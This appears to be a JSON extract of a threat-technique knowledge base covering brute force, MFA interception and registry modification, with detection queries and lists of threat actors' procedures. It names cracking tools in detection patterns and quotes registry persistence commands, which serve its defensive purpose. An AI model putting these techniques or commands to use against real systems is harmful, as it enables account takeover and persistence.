      "ZxxZhas used API functions such asProcess32First,Process32Next, andShellExecuteA.[224]"
    ]
  },
  "T1110": {
    "Name": "Brute Force",
    "Description": "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained.[1]Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism.[2]Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.Brute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access toValid Accountswithin a victim environment leveraging knowledge gathered from other post-compromise behaviors such asOS Credential Dumping,Account Discovery, orPassword Policy Discovery. Adversaries may also combine brute forcing activity with behaviors such asExternal Remote Servicesas part of Initial Access.",
    "Detects": [
      "Monitor authentication logs for system and application login failures ofValid Accounts. If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.",
      "Monitor executed commands and arguments that may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained.Analytic 1 - Command-line tools used for brute force attacks.(index=security sourcetype=\"Powershell\" EventCode=4104) OR(index=os sourcetype=\"linux_secure\" (cmdline IN (\"hydra\", \"medusa\", \"ncrack\", \"patator\", \"john\", \"hashcat\", \"rcrack\", \"w3af\", \"aircrack-ng\"))) OR (index=os sourcetype=\"macos_secure\" (cmdline IN (\"hydra\", \"medusa\", \"ncrack\", \"patator\", \"john\", \"hashcat\", \"rcrack\", \"w3af\", \"aircrack-ng\"))) | where match(CommandLine, \"(?i)(hydra|medusa|ncrack|patator|john|hashcat|rcrack|w3af|aircrack-ng)\")",
      "Monitor for many failed authentication attempts across various accounts that may result from password spraying attempts. It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network.Analytic 1 - Multiple failed logon attempts across different accounts.(index=security sourcetype=\"WinEventLog:Security\" EventCode IN (4625, 5379))OR (index=security sourcetype=\"linux_secure\" message=\"Failed password\")OR (index=security sourcetype=\"macos_secure\" message=\"Failed to authenticate user\")"
    ],
    "Procedure Examples": [
      "During the2016 Ukraine Electric Power Attack,Sandworm Teamused a script to attempt RPC authentication against a number of hosts.[2]",
      "Agriusengaged in various brute forcing activities via SMB in victim environments.[3]",
      "APT28can perform brute force attacks to obtain credentials.[4][1][5]",
      "APT38has used brute force techniques to attempt account access when passwords are unknown or when password hashes are unavailable.[6]",
      "APT39has used Ncrack to reveal credentials.[7]",
      "APT41performed password brute-force attacks on the local admin account.[8]",
      "Caterpillar WebShellhas a module to perform brute force attacks on a system.[9]",
      "Chaosconducts brute force attacks against SSH services to gain initial access.[10]",
      "CrackMapExeccan brute force supplied user credentials across a network range.[11]",
      "DarkVishnyaused brute-force attack to obtain login data.[12]",
      "Dragonflyhas attempted to brute force credentials to gain access.[13]",
      "Ember Bearused thesu-bruteforcetool to brute force specific users using thesucommand.[14]",
      "FIN5has has used the tool GET2 Penetrator to look for remote login and hard-coded credentials.[15][16]",
      "Fox Kittenhas brute forced RDP credentials.[17]",
      "HEXANEhas used brute force attacks to compromise valid credentials.[18]",
      "Kinsinghas attempted to brute force hosts over SSH.[19]",
      "OilRighas used brute force techniques to obtain credentials.[20][21]",
      "DuringOperation Dream Job,Lazarus Groupperformed brute force attacks against administrator accounts.[22]",
      "PoshC2has modules for brute forcing local administrator and AD user accounts.[23]",
      "Pysahas used brute force attempts against a central management console, as well as some Active Directory accounts.[24]",
      "QakBotcan conduct brute force attacks to capture credentials.[25][26][27]",
      "Turlamay attempt to connect to systems within a victim's network usingnet usecommands and a predefined list or collection of passwords.[28]"
    ]
  },
  "T1110.001": {
    "Name": "Brute Force:Password Guessing",
    "Description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.[1]Typically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:SSH (22/TCP)Telnet (23/TCP)FTP (21/TCP)NetBIOS / SMB / Samba (139/TCP & 445/TCP)LDAP (389/TCP)Kerberos (88/TCP)RDP / Terminal Services (3389/TCP)HTTP/HTTP Management Services (80/TCP & 443/TCP)MSSQL (1433/TCP)Oracle (1521/TCP)MySQL (3306/TCP)VNC (5900/TCP)SNMP (161/UDP and 162/TCP/UDP)In addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.[2]. Further, adversaries may abuse network device interfaces (such aswlanAPI) to brute force accessible wifi-router(s) via wireless authentication protocols.[3]In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
    "Detects": [
      "Monitor authentication logs for system and application login failures ofValid Accounts. If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.[25]",
      "Monitor for many failed authentication attempts across various accounts that may result from password guessing attempts.[25]Analytic 1 - Multiple failed logon attempts across different accounts.(index=security sourcetype=\"WinEventLog:Security\" EventCode IN (4625, 5379)) OR(index=os sourcetype=\"linux_secure\" message=\"Failed password\") OR(index=os sourcetype=\"macos_secure\" message=\"Failed to authenticate user\")"
    ],
    "Procedure Examples": [
      "APT28has used a brute-force/password-spray tooling that operated in two modes: in brute-force mode it typically sent over 300 authentication attempts per hour per targeted account over the course of several hours or days.[4]APT28has also used a Kubernetes cluster to conduct distributed, large-scale password guessing attacks.[5]",
      "APT29has successfully conducted password guessing attacks against a list of mailboxes.[6]",
      "China Chopper's server component can perform brute force password guessing against authentication portals.[7]",
      "CrackMapExeccan brute force passwords for a specified user on a single target system or across an entire network.[8]",
      "Emotethas been observed using a hard coded list of passwords to brute force user accounts.[9][10][11][12][13][14]",
      "HermeticWizardcan use a list of hardcoded credentials in attempt to authenticate to SMB shares.[15]",
      "Luciferhas attempted to brute force TCP ports 135 (RPC) and 1433 (MSSQL) with the default username or list of usernames and    passwords.[16]",
      "P.A.S. Webshellcan use predefined users and passwords to execute brute force attacks against SSH, FTP, POP3, MySQL, MSSQL, and PostgreSQL services.[17]",
      "Ponyhas used a small dictionary of common passwords against a collected list of local accounts.[18]",
      "SpeakUpcan perform brute forcing using a pre-defined list of usernames and passwords in an attempt to log in to administrative panels.[19]",
      "Xbashcan obtain a list of weak passwords from the C2 server to use for brute forcing as well as attempt to brute force services with open ports.[20][21]"
    ]
  },
  "T1110.002": {
    "Name": "Brute Force:Password Cracking",
    "Description": "Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained.OS Credential Dumpingcan be used to obtain password hashes, this may only get an adversary so far whenPass the Hashis not an option. Further,  adversaries may leverageData from Configuration Repositoryin order to obtain hashed credentials for network devices.[1]Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.[2]The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.",
    "Detects": [
      "Monitor authentication logs for system and application login failures ofValid Accounts. It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network. Consider focusing efforts on detecting other adversary behavior used to acquire credential materials, such asOS Credential DumpingorKerberoasting.",
      "Monitor for many failed authentication attempts across various accounts that may result from password spraying attempts. It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network. (ex: Windows EID 4625 or 5379)Analytic 1 - Multiple failed logon attempts across different accounts.(index=security sourcetype=\"WinEventLog:Security\" EventCode IN (4625, 5379)) OR(index=os sourcetype=\"linux_secure\" message=\"Failed password\") OR(index=os sourcetype=\"macos_secure\" message=\"Failed to authenticate user\")"
    ],
    "Procedure Examples": [
      "APT3has been known to brute force password hashes to be able to leverage plain text credentials.[3]",
      "Dragonflyhas dropped and executed tools used for password cracking, including Hydra andCrackMapExec.[4][5]",
      "FIN6has extracted password hashes from ntds.dit to crack offline.[6]",
      "Net Crawleruses a list of known credentials gathered through credential dumping to guess passwords to accounts as it spreads throughout a network.[7]",
      "DuringNight Dragon, threat actors used Cain & Abel to crack password hashes.[8]",
      "Salt Typhoonhas cracked passwords for accounts with weak encryption obtained from the configuration files of compromised network devices.[9]"
    ]
  },
  "T1110.003": {
    "Name": "Brute Force:Password Spraying",
    "Description": "Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords.[1]Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:SSH (22/TCP)Telnet (23/TCP)FTP (21/TCP)NetBIOS / SMB / Samba (139/TCP & 445/TCP)LDAP (389/TCP)Kerberos (88/TCP)RDP / Terminal Services (3389/TCP)HTTP/HTTP Management Services (80/TCP & 443/TCP)MSSQL (1433/TCP)Oracle (1521/TCP)MySQL (3306/TCP)VNC (5900/TCP)In addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.[2]In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
    "Detects": [
      "Monitor authentication logs for system and application login failures ofValid Accounts. Consider the following event IDs:[28]Domain Controllers: \"Audit Logon\" (Success & Failure) for event ID 4625.Domain Controllers: \"Audit Kerberos Authentication Service\" (Success & Failure) for event ID 4771.All systems: \"Audit Logon\" (Success & Failure) for event ID 4648.[29]",
      "Monitor for many failed authentication attempts across various accounts that may result from password spraying attempts.[29]Analytic 1 - Multiple failed logon attempts across different accounts, especially targeting common usernames.(index=security sourcetype=\"WinEventLog:Security\" EventCode IN (4625, 5379)) OR(index=os sourcetype=\"linux_secure\" message=\"Failed password\") OR(index=os sourcetype=\"macos_secure\" message=\"Failed to authenticate user\")"
    ],
    "Procedure Examples": [
      "Agriusengaged in password spraying via SMB in victim environments.[3]",
      "APT28has used a brute-force/password-spray tooling that operated in two modes: in password-spraying mode it conducted approximately four authentication attempts per hour per targeted account over the course of several days or weeks.[4][5]APT28has also used a Kubernetes cluster to conduct distributed, large-scale password spray attacks.[6]",
      "DuringAPT28 Nearest Neighbor Campaign,APT28performed password-spray attacks against public facing services to validate credentials.[7]",
      "APT29has conducted brute force password spray attacks.[8][9][10]",
      "APT33has used password spraying to gain access to target systems.[11][12]",
      "Bad Rabbit’sinfpub.datfile uses NTLM login credentials to brute force Windows machines.[13]",
      "Chimerahas used multiple password spraying attacks against victim's remote services to obtain valid user and administrator accounts.[14]",
      "CrackMapExeccan brute force credential authentication by using a supplied list of usernames and a single password.[15]",
      "Ember Bearhas conducted password spraying against Outlook Web Access (OWA) infrastructure to identify valid user names and passwords.[16]",
      "HAFNIUMhas gained initial access through password spray attacks.[17]",
      "HEXANEhas used password spraying attacks to obtain valid credentials.[18]",
      "Lazarus Groupmalware attempts to connect to Windows shares for lateral movement by using a generated list of usernames, which center around permutations of the username Administrator, and weak passwords.[19][20]",
      "Leafminerused a tool called Total SMB BruteForcer to perform internal password spraying.[21]",
      "Linux Rabbitbrute forces SSH passwords in order to attempt to gain access and install its malware onto the server.[22]",
      "MailSnipercan be used for password spraying against Exchange and Office 365.[23]",
      "Silent Librarianhas used collected lists of names and e-mail accounts to use in password spraying attacks against private sector targets.[24]"
    ]
  },
  "T1110.004": {
    "Name": "Brute Force:Credential Stuffing",
    "Description": "Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.Credential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.Typically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:SSH (22/TCP)Telnet (23/TCP)FTP (21/TCP)NetBIOS / SMB / Samba (139/TCP & 445/TCP)LDAP (389/TCP)Kerberos (88/TCP)RDP / Terminal Services (3389/TCP)HTTP/HTTP Management Services (80/TCP & 443/TCP)MSSQL (1433/TCP)Oracle (1521/TCP)MySQL (3306/TCP)VNC (5900/TCP)In addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.[1]",
    "Detects": [
      "Monitor authentication logs for system and application login failures ofValid Accounts. If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.[8]",
      "Monitor for many failed authentication attempts across various accounts that may result from credential stuffing attempts.[8]Analytic 1 - Multiple failed logon attempts across different accounts, especially using commonly used passwords.(index=security sourcetype=\"WinEventLog:Security\" EventCode IN (4625, 5379)) OR(index=os sourcetype=\"linux_secure\" message=\"Failed password\") OR(index=os sourcetype=\"macos_secure\" message=\"Failed to authenticate user\") | where match(Password, \"(?i)(Password123|Password1|123456|12345678|qwerty|abc123|letmein|welcome|monkey|admin|login|pass|guest|root)\")"
    ],
    "Procedure Examples": [
      "Chimerahas used credential stuffing against victim's remote services to obtain valid accounts.[2]",
      "TrickBotuses brute-force attack against RDP with rdpscanDll module.[3][4]"
    ]
  },
  "T1111": {
    "Name": "Multi-Factor Authentication Interception",
    "Description": "Adversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms.If a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token.[1]Adversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes).[2]Other methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Service providers can also be targeted: for example, an adversary may compromise an SMS messaging service in order to steal MFA codes sent to users’ phones.[3]",
    "Detects": [
      "Monitor for use of proxied smart card connections by an adversary may be difficult because it requires the token to be inserted into a system; thus it is more likely to be in use by a legitimate user and blend in with other network behavior. Similar toInput Capture, keylogging activity can take various forms but can may be detected via installation of a driver.Analytic 1 - Unexpected kernel driver installations.(index=security sourcetype=\"WinEventLog:System\" EventCode=7045) OR(index=os sourcetype=\"linux_audit\" action=\"add\" path=\"/lib/modules/*/kernel/drivers/\" OR path=\"/etc/udev/rules.d/\") OR(index=os sourcetype=\"macos_secure\" message=\"kextload\")",
      "Monitor for API calls associated with polling to intercept keystrokes.",
      "Monitor for changes to windows registry keys or values that may target multi-factor authentication mechanisms, such as smart cards, to gain access to credentials that can be used to access systems, services, and network resources.Analytic 1 - Unauthorized registry changes related to MFA settings.index=security sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=13 | where match(RegistryKeyPath, \"(?i)(MFA|2FA|MultiFactorAuth|SmartCard|Token|SecureID|OTP|OneTimePasscode)\")"
    ],
    "Procedure Examples": [
      "APT42has intercepted SMS-based one-time passwords and has set up two-factor authentication.[4]Additionally,APT42has used cloned or fake websites to capture MFA tokens.[5]",
      "Chimerahas registered alternate phone numbers for compromised users to intercept 2FA codes sent via SMS.[6]",
      "Kimsukyhas used a proprietary tool to intercept one time passwords required for two-factor authentication.[7]",
      "LAPSUS$has replayed stolen session token and passwords to trigger simple-approval MFA prompts in hope of the legitimate user will grant necessary approval.[8]",
      "Leviathanabused compromised appliance access to collect multifactor authentication token values duringLeviathan Australian Intrusions.[9]",
      "DuringOperation Wocao, threat actors used a custom collection method to intercept two-factor authentication soft tokens.[10]",
      "SLOWPULSEcan log credentials on compromised Pulse Secure VPNs during theDSAuth::AceAuthServer::checkUsernamePasswordACE-2FA authentication procedure.[11]",
      "Sykipotis known to contain functionality that enables targeting of smart card technologies to proxy authentication for connections to restricted network resources using detected hardware tokens.[12]"
    ]
  },
  "T1112": {
    "Name": "Modify Registry",
    "Description": "Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution.Access to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utilityRegmay be used for local or remote Registry modification.[1]Other tools, such as remote access tools, may also contain functionality to interact with the Registry through the Windows API.The Registry may be modified in order to hide configuration information or malicious payloads viaObfuscated Files or Information.[2][3][4][5]The Registry may also be modified toImpair Defenses, such as by enabling macros for all Microsoft Office products, allowing privilege escalation without alerting the user, increasing the maximum number of allowed outbound requests, and/or modifying systems to store plaintext credentials in memory.[6][2]The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.[7]OftenValid Accountsare required, along with access to the remote system'sSMB/Windows Admin Sharesfor RPC communication.Finally, Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read viaRegor other utilities using the Win32 API.[8]Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.[9][10]",
    "Detects": [
      "Monitor executed commands and arguments for actions that could be taken to change, conceal, and/or delete information in the Registry. The Registry may also be modified through Windows system management tools such as Windows Management Instrumentation and PowerShell, which may require additional logging features to be configured in the operating system to collect necessary information for analysis.",
      "Remote access to the registry can be achieved viaWindows API functionRegConnectRegistrycommand line viareg.exegraphically viaregedit.exeAll of these behaviors call into the Windows API, which uses the NamedPipe WINREG over SMB to handle the protocol information. This network can be decoded with Wireshark or a similar sensor, and can also be detected by hooking the API function.Analytic 1 - Remote Registrysource=\"Zeek:\" (dest_port=\"445\" AND proto_info.pipe=\"WINREG\") OR (proto_info.function=\"Create\" OR proto_info.function=\"SetValue\")",
      "Monitor for API calls associated with concealing Registry keys, such asReghide.[8]Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns[10]andRegDelNull[214]. Other API calls relevant to Registry Modification includeRegOpenKeyExA,RegCreateKeyExA,RegDeleteKeyExA,RegDeleteValueExA,RegEnumKeyExA,RegEnumValueExA, among others.Note: Most EDR tools do not support direct monitoring of API calls due to the sheer volume of calls produced by an endpoint but may have alerts or events that are based on abstractions of OS API calls. Dynamic malware analysis tools (i.e., sandboxes) can be used to trace the execution, including OS API calls, for a single PE binary.",
      "Monitor processes and command-line arguments for actions that could be taken to change, conceal, and/or delete information in the Registry. (i.e.reg.exe,regedit.exe). The analytic is oriented around detecting invocations ofRegwhere the parent executable is an instance ofcmd.exethat wasn’t spawned byexplorer.exe. The built-in utilityreg.exeprovides a command-line interface to the registry, so that queries and modifications can be performed from a shell, such ascmd.exe. When a user is responsible for these actions, the parent ofcmd.exewill typically beexplorer.exe. Occasionally, power users and administrators write scripts that do this behavior as well, but likely from a different process tree. These background scripts must be baselined so they can be tuned out accordingly. Analytic Event IDs are for Sysmon (Event ID 1 - process create) and Windows Security Log (Event ID 4688 - a new process has been created).Analytic 1 - Registry Edit with Modification of Userinit, Shell or Notify(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") ((CommandLine=\"reg\" CommandLine=\"add\" CommandLine=\"/d\") OR ((CommandLine=\"Set-ItemProperty\" OR CommandLine=\"New-ItemProperty\") AND CommandLine=\"-value\")) CommandLine=\"\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" (CommandLine=\"Userinit\" OR CommandLine=\"Shell\" OR CommandLine=\"Notify\")Analytic 2 - Modification of Default Startup Folder in the Registry Key 'Common Startup'(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") (CommandLine=\"reg\" AND CommandLine=\"add\" AND CommandLine=\"/d\") OR (CommandLine=\"Set-ItemProperty\" AND CommandLine=\"-value\") CommandLine=\"Common Startup\"Analytic 3 - Registry Edit with Creation of SafeDllSearchMode Key Set to 0(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\")((CommandLine=\"reg\" CommandLine=\"add\" CommandLine=\"/d\") OR (CommandLine=\"Set-ItemProperty\" CommandLine=\"-value\")) (CommandLine=\"00000000\" OR CommandLine=\"0\") CommandLine=\"SafeDllSearchMode\")",
      "Monitor for newly constructed registry keys or values to aid in persistence and execution - for example, the creation of the registry keyHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode. The key SafeDllSearchMode, if set to 0, will block the Windows mechanism for the search DLL order and adversaries may execute their own malicious dll.Analytic 1 - Registry Edit with Creation of SafeDllSearchMode Key Set to 0((source=\"WinEventLog:Security\" EventCode=\"4657\")(ObjectValueName=\"SafeDllSearchMode\" value=\"0\")) OR ((source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"13\") EventType=\"SetValue\" TargetObject=\"*SafeDllSearchMode\" Details=\"DWORD (0x00000000)\")))",
      "Monitor for unexpected deletion of windows registry keys to hide configuration information, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.",
      "Monitor for changes made to windows registry keys or values. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods).[215]Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.Detection of modification of the registry key values of Notify, Userinit, and Shell located inHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\andHKEY_LOCAL_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\. When a user logs on, the Registry key values of Notify, Userinit and Shell are used to load dedicated Windows component. Attackers may insert malicious payload following the legitimate value to launch a malicious payload.Detection of the modification of the registry key Common Startup located inHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\\andHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\\. When a user logs on, any files located in the Startup Folder are launched. Attackers may modify these folders with other files in order to evade detection set on these default folders. This detection focuses on EventIDs 4688 and 1 for process creation and EventID 4657 for the modification of the Registry Keys.Analytic 1 - Registry Edit with Modification of Userinit, Shell or Notifysource=\"WinEventLog:Security\" EventCode=\"4657\" (ObjectValueName=\"Userinit\" OR ObjectValueName=\"Shell\" OR ObjectValueName=\"Notify\") OR source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"13\" (TargetObject=\"Userinit\" OR TargetObject=\"Shell\" OR TargetObject=\"*Notify\")Analytic 2 - Modification of Default Startup Folder in the Registry Key 'Common Startup'(source=\"WinEventLog:Security\" EventCode=\"4657\" ObjectValueName=\"Common Startup\") OR (source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"13\" TargetObject=\"*Common Startup\")"
    ],
    "Procedure Examples": [
      "During the2015 Ukraine Electric Power Attack,Sandworm Teammodified in-registry Internet settings to lower internet security before launchingrundll32.exe, which in-turn launches the malware and communicates with C2 servers over the Internet.[11].",
      "AADInternalscan modify registry keys as part of setting a new pass-through authentication agent.[12]",
      "ADVSTORESHELLis capable of setting and deleting Registry values.[13]",
      "Agent Teslacan achieve persistence by modifying Registry key entries.[14]",
      "Amadeyhas overwritten registry keys for persistence.[15]",
      "APT19uses a Port 22 malware variant to modify several Registry keys.[16]",
      "APT32's backdoor has modified the Windows Registry to store the backdoor's configuration.[17]",
      "APT38uses a tool called CLEANTOAD that has the capability to modify Registry keys.[18]",
      "APT41used a malware variant called GOODLUCK to modify the registry in order to steal credentials.[19][20]",
      "APT42has modified Registry keys to maintain persistence.[21]",
      "Aquatic Pandamodified the victim registry to enable theRestrictedAdminmode feature, allowing for pass the hash behaviors to function via RDP.[22]",
      "Attor's dispatcher can modify the Run registry key.[23]",
      "Avaddonmodifies several registry keys for persistence and UAC bypass.[24]",
      "BACKSPACEis capable of deleting Registry keys, sub-keys, and values on a victim system.[25]",
      "BADCALLmodifies the firewall Registry keySYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfileGloballyOpenPorts\\List.[26]",
      "Bankshotwrites data into the Registry keyHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Pniumj.[27]",
      "Bisonalhas deleted Registry keys to clean up its prior activity.[28]",
      "BitPaymercan set values in the Registry to help in execution.[29]",
      "Black Bastahas modified the Registry to enable itself to run in safe mode, to change the icons and file extensions for encrypted files, and to add the malware path for persistence.[30][31][32][33][34][35]",
      "BlackByteperformed Registry modifications to escalate privileges and disable security tools.[36][37]",
      "BlackByte 2.0 Ransomwaremodifies the victim Registry to allow for elevated execution.[38]",
      "BlackByte Ransomwaremodifies the victim Registry to prevent system recovery.[39]",
      "BlackCathas the ability to add the following registry key on compromised networks to maintain persistence:HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services \\LanmanServer\\Paramenters[4]",
      "Blue Mockingbirdhas used Windows Registry modifications to specify a DLL payload.[40]",
      "Cardinal RATsetsHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Loadto point to its executable.[41]",
      "Catchamascreates three Registry keys to establish persistence by adding aWindows Service.[42]",
      "Caterpillar WebShellhas a command to modify a Registry key.[43]",
      "Chaescan modify Registry values to stored information and establish persistence.[44]",
      "CharmPowercan remove persistence-related artifacts from the Registry.[45]",
      "CHIMNEYSWEEPcan use the Windows Registry Environment key to change the%windir%variable to point toc:\\Windowsto enable payload execution.[46]",
      "CHOPSTICKmay modify Registry keys to store RC4 encrypted configuration information.[47]",
      "Clamblingcan set and delete Registry keys.[48]",
      "Clopcan make modifications to Registry keys.[49]",
      "Cobalt Strikecan modify Registry values withinHKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\\Excel\\Security\\AccessVBOM\\to enable the execution of additional code.[50]",
      "ComRAThas modified Registry values to store encrypted orchestrator code and payloads.[51][52]",
      "Confickeradds keys to the Registry atHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Servicesand various other Registry locations.[53][54]",
      "CrackMapExeccan create a registry key using wdigest.[55]",
      "Crimsoncan set a Registry key to determine how long it has been installed and possibly to indicate the version number.[56]",
      "CSPY Downloadercan write to the Registry under the%windir%variable to execute tasks.[57]",
      "DarkCometadds a Registry value for its installation routine to the Registry KeyHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System Enable LUA=\"0\"andHKEY_CURRENT_USER\\Software\\DC3_FEXEC.[58][59]",
      "DarkTortillahas modified registry keys for persistence.[60]",
      "DarkWatchmancan modify Registry values to store configuration strings, keylogger, and output of components.[61]",
      "DCSrvhas created Registry keys for persistence.[62]",
      "Dragonflyhas modified the Registry to perform multiple techniques through the use ofReg.[63]",
      "Earth Luscamodified the registry using the commandreg add \"HKEY_CURRENT_USER\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \"[file path]\"for persistence.[64]",
      "Ember Bearmodifies registry values for anti-forensics and defense evasion purposes.[65]",
      "EVILNUMcan make modifications to the Regsitry for persistence.[66]",
      "Exaramel for Windowsadds the configuration to the Registry in XML format.[67]",
      "Explosivehas a function to write itself to Registry values.[68]",
      "FELIXROOTdeletes the Registry keyHKCU\\Software\\Classes\\Applications\\rundll32.exe\\shell\\open.[69]",
      "Ferocioushas the ability to add a Class ID in the current user Registry hive to enable persistence mechanisms.[70]",
      "FIN8has deleted Registry keys during post compromise cleanup activities.[71]",
      "Gamaredon Grouphas removed security settings for VBA macro execution by changing registry valuesHKCU\\Software\\Microsoft\\Office\\<version>\\<product>\\Security\\VBAWarningsandHKCU\\Software\\Microsoft\\Office\\<version>\\<product>\\Security\\AccessVBOM.[72][73]",
      "Gelsemiumcan modify the Registry to store its components.[74]",
      "gh0st RAThas altered the InstallTime subkey.[75]",
      "Gorgon Groupmalware can deactivate security mechanisms in Microsoft Office by editing several keys and values underHKCU\\Software\\Microsoft\\Office\\.[76]",
      "Grandoreirocan modify the Registry to store its configuration atHKCU\\Software\\under frequently changing names including%USERNAME%andToolTech-RM.[77]",
      "GreyEnergymodifies conditions in the Registry and adds keys.[78]",
      "HermeticWiperhas the ability to modify Registry keys to disable crash dumps, colors for compressed files, and pop-up information about folders and desktop items.[79][80][81]",
      "HOPLIGHThas modified Managed Object Format (MOF) files within the Registry to run specific commands and create persistence on the system.[82]",
      "Hydraqcreates a Registry subkey to register its created service, and can also uninstall itself later by deleting this value.Hydraq's backdoor also enables remote attackers to modify and delete subkeys.[83][84]",
      "HyperStackcan add the name of its communication pipe toHKLM\\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters\\NullSessionPipes.[85]",
      "Indrik Spiderhas modified registry keys to prepare for ransomware execution and to disable common administrative utilities.[86]",
      "InvisiMolehas a command to create, set, copy, or delete a specified Registry key or value.[87][88]",
      "IPsec Helpercan make arbitrary changes to registry keys based on provided input.[89]",
      "Kapekawrites persistent configuration information to the victim host registry.[90]",
      "KEYMARBLEhas a command to create Registry entries for storing data underHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\WABE\\DataPath.[91]",
